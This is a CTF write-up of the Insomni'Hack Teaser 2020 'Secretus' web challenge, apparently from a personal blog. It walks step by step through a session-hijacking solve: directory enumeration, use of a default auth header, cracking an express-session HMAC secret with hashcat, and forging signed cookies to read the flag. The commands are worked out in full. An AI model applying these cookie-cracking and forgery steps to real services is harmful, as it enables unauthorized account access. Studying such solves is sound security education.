[«](https://blog.vihan.org/) Insomni\'Hack Teaser CTF 2020: Write-ups
=====================================================================

[](https://blog.vihan.org/insomnihack-2020/#web){.anchor}Web
============================================================

[](https://blog.vihan.org/insomnihack-2020/#secretus){.anchor}Secretus
----------------------------------------------------------------------

This had a few layers but was ultimately a session hijacking challenge.

This homepage is a dead-end. No forms, no HTTP requests, links, etc. So
next step was a dirsearch.

These entries seem important...

    [20:32:09] 301 -   39B  - /debug  ->  /home
    [20:32:09] 301 -   39B  - /debug/  ->  /home
    [20:32:42] 200 -  518B  - /package.json
    [20:32:55] 401 -   27B  - /secret

Visiting `/debug` takes us back to `/home`. Unfortunately, visiting
`/secret` gives us:

    {
        "error": "INVALID_API_KEY"
    }

Hm, well maybe we can find an API key. Let's visit `/package.json` to
see what dependencies this uses, and how it works:

    http GET http://secretus.insomnihack.ch/package.json | jq .dependencies

    {
      "body-parser": "^1.19.0",
      "cookie-session": "^1.3.3",
      "ejs": "^3.0.1",
      "express": "^4.17.1",
      "express-authentication": "^0.3.2",
      "express-session": "^1.17.0",
      "session-file-store": "^1.3.1"
    }

From this we derive a few things:

-   Sessions are being stored in files (`session-file-store`)
-   Sessions cookies are in express's default format
    (`express-session`/`cookie-session`)
-   Authentication uses `express-authentication`

Looking at the
[documentation](https://www.npmjs.com/package/express-authentication)
for `express-authentication`, we can see that `Authorization: secret` is
the header by default used for logging in. Let's try this:

    $ http GET http://secretus.insomnihack.ch/secret Authorization:secret
    HTTP/1.1 200 OK
    ... blah ...
    Set-Cookie: connect.sid=s%3Alkdh18zhtZX-vve8gThP8_NEoTkr-OsT.T4zrDEc9N2RbIViBsst5ZlWo1DfWLu0tKMTtEgmLF%2Fk; Path=/; HttpOnly

This now will take us to a page where we can add a 'token' which the
server will save. However, this input does not appear to be vulnerable
to any common attacks such as SQLi, SSTI, overflow, etc. so rather than
pursue that, let's check out the `/debug` path that previously didn't
work:

    $ http GET http://secretus.insomnihack.ch/debug Authorization:secret | pup li text{}
    -vBjlg5JlzZb1Q4u1-aO5BfKt836Zgdn.json
    ... trimmed ...
    IPzX2ibvPNrxuqYbAlVzal9yJMv2N3wx.json

These look exactly like files for the session IDs from before. The issue
is let's analyze the decoded session cookie from above. I looked up the
[source code for
`express-session`](https://github.com/expressjs/session/blob/85682a2a56c5bdbed8d7e7cd2cc5e1343c951af6/index.js#L645)
which reveals the following format:

    s:lkdh18zhtZX-vve8gThP8_NEoTkr-OsT.T4zrDEc9N2RbIViBsst5ZlWo1DfWLu0tKMTtEgmLF/k
    ^ ^                                ^
    | |                                |
    + Prefix                           + Session ID hash
      |
      + Session ID

If we want to use the sessions found in `/debug`, we'd need the server's
secret key which is used to generate the hash. `express-session` uses
the [`cookie-signature`](https://www.npmjs.com/package/cookie-signature)
library to create these hashes. Looking at the [source
code](https://github.com/tj/node-cookie-signature/blob/master/index.js#L20)
for it, we can identify that this hash is an HMAC-SHA-256. At this
points it looks like it'll be necessary to brute-force the secret key so
we can spoof a session.

Let's convert the hash into hex and then format it like
`<hash in hex>:<value>` so that way we can pass it into hashcat.

    $ echo $(
        echo 'T4zrDEc9N2RbIViBsst5ZlWo1DfWLu0tKMTtEgmLF/k' |
        base64 -D |
        xxd -p
      ):lkdh18zhtZX-vve8gThP8_NEoTkr-OsT > hash.txt

    $ $HMAC_SHA_256_MODE=1450
    $ $WORDLIST=crackstation.txt
    $ hashcat -a 0 -m $HMAC_SHA_256_MODE hash.txt $WORDLIST -O

I used the crackstation wordlist as rockyou was exhausted quickly.
Eventually, this outputs `keyboard cat` as the secret. Now all that's
left is to reconstruct a new session with the obtained session IDs from
the debug file and see what works. Rather than create some convoluted
bash script I just used CyberChef:

    $ http GET http://secretus.insomnihack.ch/debug Authorization:secret |
        pup li text{} |
        sed s/.json$// > sessions.txt

[Here's a link to my CyberChef to construct the new
sessions](https://gchq.github.io/CyberChef/#recipe=Fork('%5C%5Cn','%5C%5Cn',false)Register('(.%2B)',true,false,false)HMAC(%7B'option':'Latin1','string':'keyboard%20cat'%7D,'SHA256')From_Hex('Auto')To_Base64('A-Za-z0-9%2B/')Register('(.%2B)',true,false,true)Find_/_Replace(%7B'option':'Regex','string':'.%2B'%7D,'s:$R0.$R1',true,false,true,false)URL_Encode(false)).
I essentially just did `s:sessionId.hmacOfSessionId`. Now I request the
new secret tokens using the new session ID:

    $ http GET http://secretus.insomnihack.ch/secret \
        Authorization:secret \  
        Cookie:'connect.sid=s:C35XelHWhFhnbGnpMH5fBMGLLT0C1q0J.OMmTzUU8LzDDETCg/Iprq+q66D+3QDmLCBXW5uTZbPk; Path=/; HttpOnly' \
        | pup ul li text{}

    INS{BeSureYourSecretIsActuallySecret}